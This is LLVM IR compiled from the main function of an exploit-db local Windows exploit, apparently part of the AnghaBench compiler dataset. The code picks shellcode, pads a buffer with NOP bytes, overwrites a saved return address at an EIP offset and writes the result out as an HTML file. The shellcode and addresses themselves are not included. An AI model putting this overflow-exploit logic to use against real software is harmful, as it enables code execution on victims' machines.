; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows_x86/local/extr_11112.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows_x86/local/extr_11112.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i8*, i32* }
%struct.TYPE_3__ = type { i8*, i32 }

@.str = private unnamed_addr constant [4 x i8] c"CLS\00", align 1
@banner = common dso_local global i32 0, align 4
@buffer = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.2 = private unnamed_addr constant [20 x i8] c"Starting exploit...\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c"Too few args\00", align 1
@fbuffer = common dso_local global i32 0, align 4
@data = common dso_local global i32* null, align 8
@j = common dso_local global i32 0, align 4
@SHELL_OFFSET = common dso_local global i32 0, align 4
@shellc = common dso_local global %struct.TYPE_4__* null, align 8
@T = common dso_local global i64 0, align 8
@target = common dso_local global %struct.TYPE_3__* null, align 8
@EIP_OFFSET = common dso_local global i32 0, align 4
@HTMLFILE = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [34 x i8] c"You are using the %s ret address\0A\00", align 1
@.str.5 = private unnamed_addr constant [32 x i8] c"You are using the %s shellcode\0A\00", align 1
@.str.6 = private unnamed_addr constant [14 x i8] c"Building file\00", align 1
@.str.7 = private unnamed_addr constant [20 x i8] c"DONE! file is build\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %6 = call i32 @system(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %7 = load i32, i32* @banner, align 4
  %8 = load i8*, i8** @buffer, align 8
  %9 = call i32 @cpy(i32 %7, i8* %8)
  %10 = load i8*, i8** @buffer, align 8
  %11 = call i32 @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8* %10)
  %12 = call i32 @print(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0))
  %13 = call i32 (...) @printShell()
  %14 = call i32 (...) @printTargets()
  %15 = load i32, i32* %4, align 4
  %16 = icmp slt i32 %15, 2
  br i1 %16, label %17, label %20

17:                                               ; preds = %2
  %18 = call i32 @print(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0))
  %19 = call i32 @exit(i32 0) #3
  unreachable

20:                                               ; preds = %2
  %21 = load i32, i32* @fbuffer, align 4
  %22 = load i32*, i32** @data, align 8
  %23 = load i32*, i32** @data, align 8
  %24 = call i32 @strlen(i32* %23)
  %25 = call i32 @memcpy(i32 %21, i32* %22, i32 %24)
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = call i8* @atoi(i8* %28)
  %30 = ptrtoint i8* %29 to i32
  store i32 %30, i32* @j, align 4
  %31 = load i32, i32* @j, align 4
  switch i32 %31, label %78 [
    i32 0, label %32
    i32 1, label %41
    i32 2, label %50
    i32 3, label %59
  ]

32:                                               ; preds = %20
  %33 = load i32, i32* @fbuffer, align 4
  %34 = load i32, i32* @SHELL_OFFSET, align 4
  %35 = add nsw i32 %33, %34
  %36 = load %struct.TYPE_4__*, %struct.TYPE_4__** @shellc, align 8
  %37 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %36, i64 0
  %38 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %37, i32 0, i32 1
  %39 = load i32*, i32** %38, align 8
  %40 = call i32 @memcpy(i32 %35, i32* %39, i32 8)
  br label %80

41:                                               ; preds = %20
  %42 = load i32, i32* @fbuffer, align 4
  %43 = load i32, i32* @SHELL_OFFSET, align 4
  %44 = add nsw i32 %42, %43
  %45 = load %struct.TYPE_4__*, %struct.TYPE_4__** @shellc, align 8
  %46 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %45, i64 1
  %47 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %46, i32 0, i32 1
  %48 = load i32*, i32** %47, align 8
  %49 = call i32 @memcpy(i32 %44, i32* %48, i32 8)
  br label %80

50:                                               ; preds = %20
  %51 = load i32, i32* @fbuffer, align 4
  %52 = load i32, i32* @SHELL_OFFSET, align 4
  %53 = add nsw i32 %51, %52
  %54 = load %struct.TYPE_4__*, %struct.TYPE_4__** @shellc, align 8
  %55 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %54, i64 2
  %56 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %55, i32 0, i32 1
  %57 = load i32*, i32** %56, align 8
  %58 = call i32 @memcpy(i32 %53, i32* %57, i32 8)
  br label %80

59:                                               ; preds = %20
  %60 = load i32, i32* @fbuffer, align 4
  %61 = load i32, i32* @SHELL_OFFSET, align 4
  %62 = add nsw i32 %60, %61
  %63 = load %struct.TYPE_4__*, %struct.TYPE_4__** @shellc, align 8
  %64 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %63, i64 3
  %65 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %64, i32 0, i32 1
  %66 = load i32*, i32** %65, align 8
  %67 = call i32 @memcpy(i32 %62, i32* %66, i32 8)
  %68 = load i32, i32* @fbuffer, align 4
  %69 = load i32, i32* @SHELL_OFFSET, align 4
  %70 = add nsw i32 %68, %69
  %71 = load %struct.TYPE_4__*, %struct.TYPE_4__** @shellc, align 8
  %72 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %71, i64 3
  %73 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %72, i32 0, i32 1
  %74 = load i32*, i32** %73, align 8
  %75 = call i32 @strlen(i32* %74)
  %76 = add nsw i32 %70, %75
  %77 = call i32 @memset(i32 %76, i32 144, i32 161)
  br label %80

78:                                               ; preds = %20
  %79 = call i32 @exit(i32 0) #3
  unreachable

80:                                               ; preds = %59, %50, %41, %32
  %81 = load i8**, i8*** %5, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 2
  %83 = load i8*, i8** %82, align 8
  %84 = call i8* @atoi(i8* %83)
  %85 = ptrtoint i8* %84 to i64
  store i64 %85, i64* @T, align 8
  %86 = load i64, i64* @T, align 8
  %87 = icmp eq i64 %86, 0
  br i1 %87, label %88, label %103

88:                                               ; preds = %80
  %89 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %90 = load i64, i64* @T, align 8
  %91 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %89, i64 %90
  %92 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %91, i32 0, i32 1
  %93 = load i32, i32* %92, align 8
  %94 = call i32 @reverseInt(i32 %93)
  %95 = load i32, i32* @fbuffer, align 4
  %96 = load i32, i32* @EIP_OFFSET, align 4
  %97 = add nsw i32 %95, %96
  %98 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %99 = load i64, i64* @T, align 8
  %100 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %98, i64 %99
  %101 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %100, i32 0, i32 1
  %102 = call i32 @memcpy(i32 %97, i32* %101, i32 4)
  br label %179

103:                                              ; preds = %80
  %104 = load i64, i64* @T, align 8
  %105 = icmp eq i64 %104, 1
  br i1 %105, label %106, label %121

106:                                              ; preds = %103
  %107 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %108 = load i64, i64* @T, align 8
  %109 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %107, i64 %108
  %110 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %109, i32 0, i32 1
  %111 = load i32, i32* %110, align 8
  %112 = call i32 @reverseInt(i32 %111)
  %113 = load i32, i32* @fbuffer, align 4
  %114 = load i32, i32* @EIP_OFFSET, align 4
  %115 = add nsw i32 %113, %114
  %116 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %117 = load i64, i64* @T, align 8
  %118 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %116, i64 %117
  %119 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %118, i32 0, i32 1
  %120 = call i32 @memcpy(i32 %115, i32* %119, i32 4)
  br label %178

121:                                              ; preds = %103
  %122 = load i64, i64* @T, align 8
  %123 = icmp eq i64 %122, 2
  br i1 %123, label %124, label %139

124:                                              ; preds = %121
  %125 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %126 = load i64, i64* @T, align 8
  %127 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %125, i64 %126
  %128 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %127, i32 0, i32 1
  %129 = load i32, i32* %128, align 8
  %130 = call i32 @reverseInt(i32 %129)
  %131 = load i32, i32* @fbuffer, align 4
  %132 = load i32, i32* @EIP_OFFSET, align 4
  %133 = add nsw i32 %131, %132
  %134 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %135 = load i64, i64* @T, align 8
  %136 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %134, i64 %135
  %137 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %136, i32 0, i32 1
  %138 = call i32 @memcpy(i32 %133, i32* %137, i32 4)
  br label %177

139:                                              ; preds = %121
  %140 = load i64, i64* @T, align 8
  %141 = icmp eq i64 %140, 3
  br i1 %141, label %142, label %157

142:                                              ; preds = %139
  %143 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %144 = load i64, i64* @T, align 8
  %145 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %143, i64 %144
  %146 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %145, i32 0, i32 1
  %147 = load i32, i32* %146, align 8
  %148 = call i32 @reverseInt(i32 %147)
  %149 = load i32, i32* @fbuffer, align 4
  %150 = load i32, i32* @EIP_OFFSET, align 4
  %151 = add nsw i32 %149, %150
  %152 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %153 = load i64, i64* @T, align 8
  %154 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %152, i64 %153
  %155 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %154, i32 0, i32 1
  %156 = call i32 @memcpy(i32 %151, i32* %155, i32 4)
  br label %176

157:                                              ; preds = %139
  %158 = load i64, i64* @T, align 8
  %159 = icmp eq i64 %158, 4
  br i1 %159, label %160, label %175

160:                                              ; preds = %157
  %161 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %162 = load i64, i64* @T, align 8
  %163 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %161, i64 %162
  %164 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %163, i32 0, i32 1
  %165 = load i32, i32* %164, align 8
  %166 = call i32 @reverseInt(i32 %165)
  %167 = load i32, i32* @fbuffer, align 4
  %168 = load i32, i32* @EIP_OFFSET, align 4
  %169 = add nsw i32 %167, %168
  %170 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %171 = load i64, i64* @T, align 8
  %172 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %170, i64 %171
  %173 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %172, i32 0, i32 1
  %174 = call i32 @memcpy(i32 %169, i32* %173, i32 4)
  br label %175

175:                                              ; preds = %160, %157
  br label %176

176:                                              ; preds = %175, %142
  br label %177

177:                                              ; preds = %176, %124
  br label %178

178:                                              ; preds = %177, %106
  br label %179

179:                                              ; preds = %178, %88
  %180 = load i32, i32* @HTMLFILE, align 4
  %181 = load i32, i32* @fbuffer, align 4
  %182 = call i32 @fileBuild(i32 %180, i32 %181)
  %183 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %184 = load i64, i64* @T, align 8
  %185 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %183, i64 %184
  %186 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %185, i32 0, i32 0
  %187 = load i8*, i8** %186, align 8
  %188 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.4, i64 0, i64 0), i8* %187)
  %189 = load %struct.TYPE_4__*, %struct.TYPE_4__** @shellc, align 8
  %190 = load i32, i32* @j, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %189, i64 %191
  %193 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %192, i32 0, i32 0
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0), i8* %194)
  %196 = call i32 @print(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i64 0, i64 0))
  %197 = call i32 @print(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.7, i64 0, i64 0))
  %198 = call i32 (...) @getchar()
  ret i32 0
}

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @cpy(i32, i8*) #1

declare dso_local i32 @printf(i8*, i8*) #1

declare dso_local i32 @print(i8*) #1

declare dso_local i32 @printShell(...) #1

declare dso_local i32 @printTargets(...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memcpy(i32, i32*, i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i8* @atoi(i8*) #1

declare dso_local i32 @memset(i32, i32, i32) #1

declare dso_local i32 @reverseInt(i32) #1

declare dso_local i32 @fileBuild(i32, i32) #1

declare dso_local i32 @getchar(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
